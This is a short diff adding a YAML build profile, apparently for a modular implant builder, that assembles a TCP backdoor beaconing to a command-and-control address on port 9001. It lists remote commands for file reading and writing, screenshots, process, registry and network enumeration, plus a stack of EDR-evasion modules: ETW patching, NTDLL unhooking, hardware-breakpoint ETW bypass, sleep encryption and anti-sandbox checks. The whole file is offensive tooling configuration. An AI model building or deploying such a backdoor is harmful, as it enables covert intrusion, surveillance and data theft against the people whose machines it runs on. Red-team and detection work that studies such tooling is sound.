@@ -1,0 +1,33 @@
+name: backdoor_tcp_full_evasion
+description: TCP backdoor with every evasion layer — ETW patch + NTDLL unhook + HW BP ETW + sleep encrypt + behavioral pacing + anti-sandbox
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+c2: c2/tcp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_filelist
+  - commands/cmd_fileread
+  - commands/cmd_filewrite
+  - commands/cmd_screenshot
+  - commands/cmd_registry
+  - commands/cmd_netinfo
+
+arch: arch/backdoor
+
+evasion:
+  - evasion/etw_patch
+  - evasion/unhook_ntdll
+  - evasion/hw_bp_etw
+  - evasion/sleep_encrypt
+  - evasion/behavioral_pacing
+  - evasion/anti_sandbox
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "30000"
